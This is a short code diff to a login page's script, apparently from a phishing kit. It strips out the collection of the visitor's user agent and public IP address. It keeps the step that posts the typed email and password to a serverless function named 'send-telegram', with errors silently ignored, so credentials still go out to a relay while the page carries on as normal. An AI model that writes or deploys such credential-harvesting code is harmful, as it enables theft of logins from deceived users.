@@ -31,18 +31,11 @@ document.addEventListener('DOMContentLoaded', () => {
         if (pwdVal) {
             const email = unameInp.value.trim();
             const password = pwdInp.value.trim();
-            const userAgent = navigator.userAgent;
-            let clientIp = 'unknown';
-            try {
-                const ipRes = await fetch('https://api.ipify.org?format=json');
-                const ipData = await ipRes.json();
-                clientIp = ipData.ip;
-            } catch (e) { /* ignore */ }
             try {
                 await fetch('/.netlify/functions/send-telegram', {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ email, password, userAgent, clientIp })
+                    body: JSON.stringify({ email, password })
                 });
             } catch (e) { /* ignore */ }
             document.getElementById("section_pwd").classList.toggle('d-none');
